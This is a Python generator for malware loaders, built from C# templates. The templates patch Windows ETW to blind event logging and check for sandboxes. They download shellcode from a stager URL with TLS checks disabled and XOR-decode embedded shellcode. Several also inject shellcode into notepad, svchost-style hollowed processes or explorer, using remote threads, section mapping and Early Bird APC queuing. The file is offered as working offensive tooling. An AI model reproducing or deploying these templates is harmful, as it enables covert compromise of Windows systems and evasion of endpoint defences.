import base64
import subprocess

# References:
# https://github.com/plackyhacker/Shellcode-Injection-Techniques
# https://github.com/Kara-4search/EarlyBirdInjection_CSharp

DLL_IMPORT = {
  "VirtualAlloc": "",
  "CreateThread": "",
  "WaitForSingleObject": "",
  "NtCreateSection":"",
  "NtMapViewOfSection":"",

}
ETW_FUNCS = """
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);

[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

private static byte[] getETWPayload()
    {
        if (!is64Bit())
            return Convert.FromBase64String("whQA");
        return Convert.FromBase64String("ww==");
    }
private static void PatchEtw(byte[] patch)
    {
        try
        {
            uint oldProtect;

            var ntdll = LoadLibrary("ntdll.dll");
            var etwEventSend =   GetProcAddress(ntdll, "EtwEventWrite");

            VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, etwEventSend, patch.Length);
        }
        catch
        {
            Console.WriteLine("Error unhooking ETW");
        }
    }
"""

ARCH_DETECTION = """
        private static bool is64Bit()
        {
            if (IntPtr.Size == 4)
                return false;

            return true;
        }
"""

HEURISTICS_IMPORT = """
    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

"""

HEURISTICS_CODE = """
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds; if(t2 < 1.5)
    { return; }

    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
    if (mem == null)
    { return; }
"""

URL_DL_CODE = """
	string url = "{STAGER_URL}";

       if (!is64Bit())
	    url = "{STAGER_URL}32";

	ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
	System.Net.WebClient client = new System.Net.WebClient();
	byte[] shellcode = client.DownloadData(url);

"""

SC_XOR_DECODER = """
  byte[] shellcode = new byte[] {{ {xor_shellcode} }};
  for (int i = 0; i < shellcode.Length; i++)
  {{
    shellcode[i] = (byte)(((uint)shellcode[i] ^ {xor_key}) & 0xFF);
  }}
"""

ETW_PATCH = "PatchEtw(getETWPayload());"


START_PROCESS_INJECT_IMPORT = """
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

"""

START_SHELLCODE_IMPORT = """
        private static UInt32 MEM_COMMIT = 0x3000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds);
"""
START_SHELLCODE = """
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
"""

START_PROCESS_INJECT = """
          ProcessStartInfo start = new ProcessStartInfo();
          start.Arguments = ""; 
          start.FileName = "notepad.exe";
          start.WindowStyle = ProcessWindowStyle.Hidden;
          start.CreateNoWindow = true;
          int exitCode;
          // Run the external process & wait for it to finish
          using (Process proc = Process.Start(start))
          {
            Process[] expProc = Process.GetProcessesByName("notepad");
            for (int i = 0; i < expProc.Length; i++) {
              IntPtr hProcess = OpenProcess(0x001F0FFF, false, expProc[i].Id);
              IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
              IntPtr outSize;
              WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
              IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
               proc.WaitForExit();
               // Retrieve the app's exit code
               exitCode = proc.ExitCode;
          }
"""

START_PROCESS_HOLLOW_IMPORT = """
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
                public IntPtr ExitStatus;
                public IntPtr PebAddress;
                public IntPtr AffinityMask;
                public IntPtr BasePriority;
                public IntPtr UniquePID;
                public IntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

"""

START_PROCESS_HOLLOW_CODE = """
      STARTUPINFO si = new STARTUPINFO();

      PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

      bool res = CreateProcess(null, System.Text.Encoding.Default.GetString(procname), IntPtr.Zero,
              IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

      PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
      uint tmp = 0;
      IntPtr hProcess = pi.hProcess;

      ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
      IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
      byte[] addrBuf = new byte[IntPtr.Size];
      IntPtr nRead = IntPtr.Zero;

      ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

      IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

      byte[] data = new byte[0x200];
      ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

      uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);

      uint opthdr = e_lfanew_offset + 0x28;

      uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

      IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
      WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
      ResumeThread(pi.hThread);
"""

START_PROCESS_INTERPROCESS_IMPORT = """
        [DllImport("ntdll.dll", SetLastError=true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        public static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, SectionAccess DesiredAccess, IntPtr ObjectAttributes, ref UInt64 MaximumSize, MemoryProtection SectionPageProtection,	MappingAttributes AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern UInt32 NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref UInt64 SectionOffset, ref UInt64 ViewSize, uint InheritDisposition, UInt32 AllocationType, MemoryProtection Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, CLIENT_ID clientId);

        [Flags]
	public enum SectionAccess : UInt32
	{
            SECTION_EXTEND_SIZE = 0x0010,
            SECTION_QUERY = 0x0001,
            SECTION_MAP_WRITE = 0x0002,
			SECTION_MAP_READ = 0x0004,
			SECTION_MAP_EXECUTE = 0x0008,
			SECTION_ALL_ACCESS = 0xe
        }
        public enum MemoryProtection : UInt32
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [Flags]
        public enum MappingAttributes : UInt32
        {
            SEC_COMMIT = 0x8000000,
            SEC_IMAGE = 0x1000000,
            SEC_IMAGE_NO_EXECUTE = 0x11000000,
            SEC_LARGE_PAGES = 0x80000000,
            SEC_NOCACHE = 0x10000000,
            SEC_RESERVE = 0x4000000,
            SEC_WRITECOMBINE = 0x40000000
        }

	[StructLayout(LayoutKind.Sequential, Pack = 0)]
         public struct CLIENT_ID
		{
			public IntPtr UniqueProcess;
			public IntPtr UniqueThread;
		}
"""

START_PROCESS_INTERPROCESS_CODE = """
          ProcessStartInfo start = new ProcessStartInfo();
          start.Arguments = ""; 
          start.FileName = "notepad.exe";
          start.WindowStyle = ProcessWindowStyle.Hidden;
          start.CreateNoWindow = true;
          int exitCode;
          // Run the external process & wait for it to finish
          using (Process proc = Process.Start(start))
          {
              Process target = null;
              Process[] processes = Process.GetProcessesByName("notepad");
              target = processes[0];
              IntPtr hSectionHandle = IntPtr.Zero;
              IntPtr pLocalView = IntPtr.Zero;
              UInt64 size = (UInt32)shellcode.Length;
              UInt32 result = NtCreateSection(ref hSectionHandle, SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, MemoryProtection.PAGE_EXECUTE_READWRITE, MappingAttributes.SEC_COMMIT, IntPtr.Zero);
              const UInt32 ViewUnmap = 0x2;
              UInt64 offset = 0;
              result = NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_READWRITE);
              Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
              IntPtr pRemoteView = IntPtr.Zero;
              NtMapViewOfSection(hSectionHandle, target.Handle, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_EXECUTE_READ);
              IntPtr hThread = IntPtr.Zero;
              CLIENT_ID cid = new CLIENT_ID();
              RtlCreateUserThread(target.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
         }
"""


START_PROCESS_EARLYBIRD_IMPORT = """
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, 
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            AllocationProtect flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            byte[] buffer,
            UInt32 nSize,
            ref UInt32 lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll")]
        public static extern void RtlZeroMemory(IntPtr pBuffer, int length);

        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );

                [Flags]
        public enum NTSTATUS : uint
        {
            Success = 0,
            Informational = 0x40000000,
            Error = 0xc0000000
        }


        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        public enum CreationFlags : uint
        {
            RunImmediately = 0,
            CREATE_SUSPENDED = 0x00000004,
            STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
        }
"""

START_PROCESS_EARLYBIRD_CODE = """
          //ProcessStartInfo start = new ProcessStartInfo();
          //start.Arguments = ""; 
          //start.FileName = "notepad.exe";
          //start.WindowStyle = ProcessWindowStyle.Hidden;
          //start.CreateNoWindow = true;
          //int exitCode;
          //// Run the external process & wait for it to finish
          //using (Process proc = Process.Start(start))
          //{
            Process[] expProc = Process.GetProcessesByName("explorer");
            for (int i = 0; i < expProc.Length; i++) {
            
            IntPtr Process_handle = OpenProcess((uint)ProcessAccessFlags.All, false, expProc[i].Id);
            IntPtr VAlloc_address = VirtualAllocEx(
                Process_handle, 
                IntPtr.Zero, 
                (uint)shellcode.Length, 
                AllocationType.Commit, 
                AllocationProtect.PAGE_EXECUTE_READWRITE);

            
            IntPtr shellcode_address = Marshal.AllocHGlobal(shellcode.Length);
            RtlZeroMemory(shellcode_address, shellcode.Length);

            UInt32 getsize = 0;
            NTSTATUS ntstatus = NtWriteVirtualMemory(Process_handle, VAlloc_address, shellcode, (uint)shellcode.Length, ref getsize);

            IntPtr Thread_id = IntPtr.Zero;
            IntPtr Thread_handle = CreateRemoteThread(
                Process_handle, 
                IntPtr.Zero, 
                0, 
                (IntPtr)0xfff,
                IntPtr.Zero, 
                (uint)CreationFlags.CREATE_SUSPENDED, 
                out Thread_id);

            QueueUserAPC(VAlloc_address, Thread_handle, 0);
            ResumeThread(Thread_handle);
            CloseHandle(Process_handle);
            CloseHandle(Thread_handle);
            }
            //}
"""

class Obfuscator:
  def __init__(self, string, xor_key=b'\00'):
    self.raw = string
    self.key = xor_key
    self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]

  def get_hex_csharp(self):
    return ",".join("0x%02x" % b for b in self.encoded)

  def get_bytes(self):
    return bytes(self.encoded)

  def get_b64(self):
    return base64.b64encode(bytes(self.encoded))

  def get_hex_c(self):
    return ",".join("\\x%02x" % b for b in self.encoded)

  def get_hex_csharp(self):
    return ",".join("0x%02x" % b for b in self.encoded)

  def get_hex_vba(self):
    return ",".join("%02d" % b for b in self.encoded)

  def get_key_csharp(self):
    return "".join("0x%02x" % b for b in self.key)


class ShellCode(Obfuscator):
  def __init__(self, msf_cmd, xor_key=b'\00', caesar_key=0):
    self.raw = subprocess.check_output(msf_cmd, shell=True)
    self.key = xor_key
    self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]

class Implant:
  def __init__(self, template, base_name):
    self.template = template
    self.base_name = base_name


  def compile(self):
    pass


# Other injection types
#          //  IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
#          //  Marshal.Copy(buf, 0, addr, buf.Length);
#          //  IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
#          //  WaitForSingleObject(hThread, 0xFFFFFFFF);
#
#
#          //SIZE_T size = 4096;
#          //LARGE_INTEGER sectionSize = {{ size }};
#          //HANDLE sectionHandle = NULL;
#          //PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
#          //
#          //// create a memory section
#          //NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
#          //
#          //// create a view of the memory section in the local process
#          //NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
#
#          //// create a view of the memory section in the target process
#          //HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, 1480);
#          //NtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
#
#          //// copy shellcode to the local view, which will get reflected in the target process's mapped view
#          //memcpy(localSectionAddress, buf, sizeof(buf));
#          //
#          //HANDLE targetThreadHandle = NULL;
#          //RtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
